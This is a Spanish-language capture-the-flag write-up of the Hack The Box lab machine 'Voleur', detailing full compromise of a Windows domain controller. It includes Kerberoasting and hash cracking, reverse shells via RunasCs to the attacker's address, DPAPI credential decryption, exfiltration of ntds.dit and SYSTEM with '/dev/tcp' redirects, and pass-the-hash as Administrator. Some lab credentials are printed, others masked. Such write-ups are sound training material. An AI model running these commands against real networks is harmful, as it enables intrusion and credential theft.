# Voleur

  <img width="632" height="506" alt="image" src="https://github.com/user-attachments/assets/291eb62f-7cc9-480a-98e4-46409bf59599" />

# Reconocimiento

```bash
nmap -Pn -n -sT -p- --min-rate 5000 10.10.11.76 -oN nmap.txt
```
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 10:30 -03
Nmap scan report for 10.10.11.76
Host is up (0.15s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2222/tcp  open  EtherNetIP-1
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
55599/tcp open  unknown
55600/tcp open  unknown
55602/tcp open  unknown
55625/tcp open  unknown
57311/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 39.68 seconds

```

```bash
nmap -Pn -n -sT -sCV -p53,88,135,139,389,445,464,593,636,2222,3268,3269,5985,9389,49664,49668,52134,52135,52136,52162,62282 --min-rate 5000 10.10.11.76 -oN nmap.txt
```
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 10:32 -03
Nmap scan report for 10.10.11.76
Host is up (0.17s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-20 21:32:51Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
2222/tcp  open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
49664/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
52134/tcp filtered unknown
52135/tcp filtered unknown
52136/tcp filtered unknown
52162/tcp filtered unknown
62282/tcp filtered unknown
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-07-20T21:33:45
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 8h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.47 seconds

```

# Configuraciones Iniciales

>>> Sincronizacion de reloj con el DC
>>>
>>> Configuracion de /etc/hosts
>>> 
>>> Configuracion de /etc/krb5.conf

configuramos el `/etc/hosts` para el dns local

```bash     
echo '10.10.11.76 DC.voleur.htb DC  voleur.htb' >> /etc/hosts
```

configuramos nuestro cliente `kerberos` ya que es posible lo lleguemos a necesitar en el futuro (Kerberos activo en el host objetivo)

```bash
nano /etc/krb5.conf
```
```bash
[libdefaults]
    default_realm = VOLEUR.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    rdns = false

[realms]
    VOLEUR.HTB = {
        kdc = DC.voleur.htb
        admin_server = DC.voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
```

Sincronizamos nuestro reloj con el `DC`

```bash
ntpdate voleur.htb
```
```bash
2025-07-20 18:40:18.826261 (-0300) +28801.228453 +/- 0.087095 voleur.htb 10.10.11.76 s1 no-leap
CLOCK: time stepped by 28801.228453
```

## Credenciales iniciales - Explotacion

Como en un Pentesting real, comenzaremos con credenciales de bajos privilegios para ver si llegamos a comprometer el entorno `AD`
>>> Credenciales:  ryan.naylor / HollowOct31Nyt

En principio no podemos hacer uso de las credenciales de forma directa

<img width="1917" height="271" alt="image" src="https://github.com/user-attachments/assets/80ca7c19-39a0-4f60-adcf-45c500a450b9" />

asi que vamos a generar un ticket TGT

```bash
impacket-getTGT voleur.htb/'ryan.naylor':'HollowOct31Nyt'
```

<img width="1917" height="203" alt="image" src="https://github.com/user-attachments/assets/9e4ba537-792f-4a85-b753-9abb8217947c" />

configuramos la variable de entorno `KRB5CCNAME`

```bash
export KRB5CCNAME=ryan.naylor.ccache
```

volvemos a probar enumeracion con autenticacion kerberos

```bash
nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' --shares -k
```

<img width="1917" height="322" alt="image" src="https://github.com/user-attachments/assets/39fdefe4-74cf-4be3-9461-1abe1407d2f6" />

vamos a continuar con la enumeracion de recursos compartidos ahora

```bash
impacket-smbclient -k DC
```

<img width="1917" height="954" alt="image" src="https://github.com/user-attachments/assets/05c056fa-a5a6-496e-bfa1-b735558d31c8" />

conseguimos un archivo el cual descargamos, pero al intentar abrirlo no podemos asi que primero instalamos `libreoffice`

```bash
sudo apt install libreoffice -y
```

<img width="1917" height="699" alt="image" src="https://github.com/user-attachments/assets/28246cd7-171c-46a6-b8b7-3c661e336fec" />


<img width="1917" height="265" alt="image" src="https://github.com/user-attachments/assets/4d9e9a41-adf5-45cb-a15c-fcf35e17dbbd" />

se encuentra protegido por contrasena asi que intentaremos crackearlo

```bash
office2john Access_Review.xlsx > office_hash.hash
```

```bash
john -w=/usr/share/wordlists/rockyou.txt office_hash.hash
```

<img width="1600" height="254" alt="image (5)" src="https://github.com/user-attachments/assets/1d723a98-c8b1-4798-a805-9c6e621c73b3" />

ahora con la password accedemos al documento

<img width="1600" height="369" alt="image (6)" src="https://github.com/user-attachments/assets/ced01f59-4798-43e9-a5c3-952255c269e8" />

hemos conseguido posibles credenciales, pero antes vamos a recopilar informacion con `bloodhound-python`

```bash
bloodhound-python -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -d voleur.htb -ns 10.10.11.76 -c ALl --zip
```
```bash
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: voleur.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.voleur.htb
INFO: Done in 00M 31S
INFO: Compressing output into 20250720194100_bloodhound.zip
```

importamos el .zip a `bloodhund`

<img width="1917" height="1010" alt="image" src="https://github.com/user-attachments/assets/e8707575-1081-40a0-acd5-59718ec898e8" />

por aqui no tenemos mucho que hacer asi que chequemos los usuarios que conseguimos en el archivo anterior

User: `SVC_LDAP`

<img width="1917" height="1010" alt="image" src="https://github.com/user-attachments/assets/5e6f5e88-85cd-4da5-85db-0fe08b911426" />

<img width="1917" height="1010" alt="image" src="https://github.com/user-attachments/assets/692a659c-2622-4744-afae-ed0902c20375" />

como observamos, el usuario `SVC_LDAP` tiene permisos `WiteSPN` sobre el usuario `SVC_WINRM`, por lo que haremos un ataque `Kerberoast` para obtener hash descifrable e intentar obtener acceso remoto via `winrm`.


primero generamos un ticket kerberos del usuario `SVC_LDAP` con sus credenciales, haciendo uso de las que obtuvimos en el archivo anterior descargado

```bash
impacket-getTGT voleur.htb/'svc_ldap':'M1********'
```

```bash
export KRB5CCNAME=svc_ldap.ccache
```

procedemos a realizar el ataque `Kerberoast`. Primero nos vamos a clonar el repositorio de la herramienta `targetedKerberoast.py` para despues hacer el ataque

```bash
git clone https://github.com/ShutdownRepo/targetedKerberoast.git # clonamos el repositorio
```
```bash
cd targetedKerberoast # accedemos al directorio de la herramienta
```
```bash
cp targetedKerberoast.py /usr/bin/targetedKerberoast # para llamar la herramienta en el futuro desde cualquier ubicacion del sistema
```

>>> ataque

```bash
targetedKerberoast -v -d 'voleur.htb' -u 'svc_ldap' -k --no-pass --dc-ip 10.10.11.76 --dc-host DC.voleur.htb -f hashcat -o kerberoas.hash
```

<img width="1917" height="286" alt="image" src="https://github.com/user-attachments/assets/4437f13d-39ec-49fb-94fe-d765d56ec0df" />

lo generamos en el formato que mas nos convenga, en mi caso formato hashcat para el crackeo offline

```bash
hashcat --identify kerberoas.hash # identificamos el numero asignado por hashcat para este hash
```
```bash
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol


```

procedemos con el crackeo

```bash
hashcat -m 13100 -a 0 -w 4 -d 1 kerberoas.hash /usr/share/wordlists/rockyou.txt
```

>>> Nota: en caso de usar hashcat, deben configurar para su situacion, ya que en mi caso hago uso de gpu (-w 4 -d 1) para acelerar el crackeo 

<img width="1600" height="814" alt="image (7)" src="https://github.com/user-attachments/assets/b42057e0-4cea-45c3-a602-f2312db1c775" />

obtenemos las credenciales para el usuario `svc-winrm` asi que nos autenticamos con el servicio `winrm`

```bash
impacket-getTGT voleur.htb/'svc_winrm':'AFire***********afi' # primero generamos el ticket tgt para la autenticacion kerberos winrm
```
```bash
export KRB5CCNAME=svc_winrm.ccache
```
```bash
evil-winrm -i DC.voleur.htb -k -u svc_winrm -r VOLEUR.HTB # nos autenticamos!
```

<img width="1600" height="647" alt="image (8)" src="https://github.com/user-attachments/assets/b4f5b2b4-abd1-4d7c-b333-b2a1a1c4fa76" />

ahora el objetivo sera obtener una shell como el usuario `svc_ldap` ya que como vimos antes, este pertenece al grupo `RESTORE_USERS` y mi objetivo es restaurar el usuario `Todd.Wolfe` y testear la password que se localiza en el archivo `office`

<img width="1917" height="1008" alt="image" src="https://github.com/user-attachments/assets/cd6238e8-fd40-448f-9059-d1b138af1571" />

asi que primero cargamos `RunasCs.exe` a traves de `winrm`

```bash
upload RunasCs.exe
```

<img width="1917" height="336" alt="image" src="https://github.com/user-attachments/assets/f1e381cc-2ff5-41bb-be60-eff67a879c99" />

ahora nos colocamos en escucha en nuestra maquina atacante

```bash
nc -lnvp 9999
```
lanzamos la shell como `svc_ldap`

```bash
./RunasCs.exe svc_ldap M1********Vn powershell -r 10.10.14.152:9999
```
obtenemos la shell como `svc_ldap` y al consultar los usuarios eliminados, vemos nuestro usuario objetivo

<img width="1917" height="962" alt="image" src="https://github.com/user-attachments/assets/cbcff543-fc8d-4024-b2ab-df3677040189" />

asi que intentamos restaurar el usuario

```powershell
Get-ADObject -Filter 'isDeleted -eq $true -and Name -like "*Todd Wolfe*"' -IncludeDeletedObjects | Restore-ADObject
```

```powershell
net user /domain
User accounts for \\DC

-------------------------------------------------------------------------------
Administrator            krbtgt                   svc_ldap                 
todd.wolfe               
The command completed successfully.

```
hemos restaurado el usuario `todd.wolfe` asi que testeamos la credencial que conseguimos antes y para esto vamos a lanzar una nueva shell con `RunasCs.exe`

```bash
nc -lnvp 9998 # en nuestra maquina atacante
```

```powershell
./RunasCs.exe 'todd.wolfe' Ni*******14 powershell -r 10.10.14.152:9998
```

Obtenemos acceso como `todd.wolfe`

<img width="1917" height="487" alt="image" src="https://github.com/user-attachments/assets/1371586a-04e6-4686-bb50-82b599d948f2" />

revisando los grupos a los cuales pertenece este usuario

```powershell
whoami /groups
```

<img width="1917" height="398" alt="image" src="https://github.com/user-attachments/assets/a7d7b75a-23e5-4aa3-a411-f8d02f229bbb" />

vemos que pertenece al grupo `Second-Line Technicians` y si nos vamos hasta el directorio de los recursos compartidos `C:\IT` observamos 3 directorios y uno relacionado con el nombre del grupo al que pertenece el usuario

<img width="1917" height="398" alt="image" src="https://github.com/user-attachments/assets/6acb87e2-be6e-45c9-89eb-62929cf80a0f" />

aparentemente llegamos hasta el mismo directorio del usuario `todd.wolfe`, pero si intentamos un ataque `DPAPI` (el cual ya lo habia intentado antes pero no me funciono) ahora si tenemos resultados

## DPAPI

Nos vamos hasta el directorio: 

>>> C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110 

conseguimos la `masterkey`, ahora vamos a ver si conseguimos archivos para desencriptar en otros directorios

<img width="1917" height="398" alt="image" src="https://github.com/user-attachments/assets/b655b4c7-dd6e-4d69-b844-5929b00698f7" />

intente desencriptar este archivo pero no pude asi que continuamos y llegamos hasta:

>>> C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials

<img width="1917" height="287" alt="image" src="https://github.com/user-attachments/assets/9d88dac1-d13d-4884-a561-e1cef59d6198" />

donde conseguimos un segundo archivo el cual vamos intentar desencriptar y ver si localizamos credenciales, lo primero sera moverlo a un directorio donde podamos escribir nosotros y otros usuarios, por lo que lo copiamos al siguiente directorio:

```powershell
copy 772275FAD58525253490A9B0039791D3 C:\Users\'All Users'\credencitials
```

ahora desde la instancia donde accedimos via `winrm` nos vamos hasta donde se localiza el archivo y lo descargamos

<img width="1917" height="583" alt="image" src="https://github.com/user-attachments/assets/50266a12-dc0d-4cf6-8608-d054bb26b3e9" />

ahora vamos a intentar desencriptarlo desde nuestra maquina atacante

```bash
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password {password del usuario todd.wolfe}
```

<img width="1600" height="357" alt="image (9)" src="https://github.com/user-attachments/assets/5e4aac9d-d425-422e-b72f-c613065b8f2d" />

nos quedamos con el hash `Decrypted key` el cual nos va permitir desencriptar el archivo `credencitials`

```bash
impacket-dpapi credential -file credencitials -key {hash Decrypted key}
```

<img width="1600" height="357" alt="image (10)" src="https://github.com/user-attachments/assets/9e408c92-b959-4b71-b62d-745b692ce878" />

hemos obtenido credenciales del usuario `jeremy.combs` y si chequeamos en `bloodhound` vemos que podemos conectarnos via `winrm` ya que pertenece a `REMOTE-MANAGEMENT`

<img width="1917" height="911" alt="image" src="https://github.com/user-attachments/assets/06c792c7-e73e-4a85-ae0f-1c49f015409e" />

Ahora para conectarnos via `winrm` primero solicitamos el ticket TGT

```bash
impacket-getTGT voleur.htb/'jeremy.combs':'qT*********'
```

```bash
export KRB5CCNAME=jeremy.combs.ccache
```

```bash
evil-winrm -i DC.voleur.htb -k -u 'jeremy.combs' -r VOLEUR.HTB
```

<img width="1600" height="522" alt="image (11)" src="https://github.com/user-attachments/assets/f1d714ee-694c-4e3c-bd4f-255e116ceaf0" />


como ya vimos a que grupos pertenece este usuario en `bloodhound` nos iremos directamente a los recursos compartidos a ver que conseguimos

<img width="1917" height="765" alt="image" src="https://github.com/user-attachments/assets/14347bba-6f8d-4518-bcd8-e362a07aa579" />

nos conseguimos con una llave ssh y una nota por lo que lo descargamos y leemos la nota

<img width="1917" height="296" alt="image" src="https://github.com/user-attachments/assets/3adcf90a-57cb-41ab-a7fe-2587761ce1be" />

como no se a quien pertenece la llave ssh, vamos a averiguarlo

```bash
cat id_rsa |grep -v - |tr -d '\n' |base64 -d
```

<img width="1917" height="395" alt="image" src="https://github.com/user-attachments/assets/1bcfa91b-7237-408b-a2a5-0d1e8e692e35" />

le pertenece al usuario `svc_backup`, le asignamos los permisos adecuados a la llave ssh y accedemos

```bash
chmod 600 id_rsa 
```

```bash
ssh -i id_rsa svc_backup@10.10.11.76 -p 2222
```


<img width="1917" height="710" alt="image" src="https://github.com/user-attachments/assets/4a6015e2-bad4-4de9-af13-3d02c64792fe" />


consultamos los permisos sudo y vemos que podemos ejecutar cualquier comando como root asi que escalamos 

<img width="1917" height="441" alt="image" src="https://github.com/user-attachments/assets/ec3a43fb-c977-4ef5-a662-b382bb7314ea" />

revisando el sistema, podemos ver que se a montado la unidad `C:\` de Windows wn `/mnt/c`

<img width="1917" height="441" alt="image" src="https://github.com/user-attachments/assets/3fbfab39-bc77-4bb8-ac2a-44b02b2a465e" />

asi que navegamos hasta el directorio `/mnt/c`

<img width="1917" height="582" alt="image" src="https://github.com/user-attachments/assets/fb7d64c0-40f5-4a0c-8ac7-19ba91c4adb3" />

es decir, tenemos acceso al sistema Windows desde `WSL`, navegamos hasta el directorio donde obtuvimos la llave `ssh` y la nota para acceder hasta el directorio `backup` que estaba alli

<img width="1917" height="374" alt="image" src="https://github.com/user-attachments/assets/9d1cc09a-1ad1-4803-bad3-07febe293fd1" />

teniendo acceso a estos archivos tenemos control total del `DC` asi que vamos a ello. Primero vamos a pasar los archivos `ntds.dit` y `SYSTEM` a nuestra maquina

>>> Desde nuestra maquina

```bash
nc -lnvp 5555 > ntds.dit
```

>>> Desde la Instancia ssh

```bash
cat ntds.dit > /dev/tcp/10.10.14.152/5555
```
a continuacion enviamos el `SYSTEM` repitiendo el proceso

>>> Desde nuestra maquina

```bash
nc -lnvp 5555 > SYSTEM
```
>>> Desde la Instancia ssh

```bash
cat SYSTEM > /dev/tcp/10.10.14.152/5555
```

ahora usaremos `impacket-secretsdump` para obtener los hashes que necesitamos

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM local
```

```bash
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a***************b883d2d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238************3f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656******************259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cf***************c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db08******************2634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c64********************323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a7******************09976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec***************052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5*********************749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:04933*****************80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f6504******************027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92*****************89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae********************f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e377177574*****************d421:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab********************7716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af*******************f861b10cc
Administrator:des-cbc-md5:459*************dcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1f**************e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee******************f451782
DC$:des-cbc-md5:64*************bff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d2********************eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5*****************d535c211
krbtgt:des-cbc-md5:34a***************86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e***********************899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417*******************33a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:43**********97a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd***********************05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d******************953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf****************220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a*************************433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73***************dadef53066
voleur.htb\lacey.miller:des-cbc-md5:6e*************7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f59**********************bf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6****************8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1a***************776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f***********************cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e195********************1cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab*************f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c11*************************ff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363*********************67137c1395
voleur.htb\svc_iis:des-cbc-md5:70*******************f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a**********************9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef22*********************7f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192**************5257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b77**************************70eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21**********************122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:3***************10ab
[*] Cleaning up... 

```

Obtuvimos todos los hashes, asi que vamos a tomar el de `Administrator` y solicitar un ticket Kerberos para autenticarnos via `WinRm`

```bash
impacket-getTGT VOLEUR.HTB/Administrator -hashes :e656e07c***********b259ad2
```

```bash
export KRB5CCNAME=Administrator.ccache
```

```bash
evil-winrm -i DC.voleur.htb -u Administrator -r VOLEUR.HTB
```

<img width="1599" height="777" alt="image (12)" src="https://github.com/user-attachments/assets/4f867edb-d4fb-4446-8e86-cddd6649d9ed" />






















